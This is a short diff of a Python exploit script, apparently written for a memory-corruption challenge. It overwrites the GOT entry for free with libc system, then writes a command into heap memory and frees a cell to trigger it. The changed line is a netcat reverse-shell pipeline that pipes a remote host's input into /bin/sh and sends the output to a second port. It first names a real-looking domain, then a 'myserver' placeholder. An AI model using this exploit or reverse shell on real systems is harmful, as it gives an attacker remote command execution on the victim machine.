@@ -151,7 +151,7 @@ a_write(got_free, struct.pack("<Q",libc_system))
 
 print "%x" % struct.unpack("<Q",a_read(got_free,8))[0]
 
-a_write(heap_base+0x1000,"nc ssh.goatskin.xyz 10291 | /bin/sh | nc ssh.goatskin.xyz 10292\x00")
+a_write(heap_base+0x1000,"nc myserver 10291 | /bin/sh | nc myserver 10292\x00")
 
 
 free_cell(3)
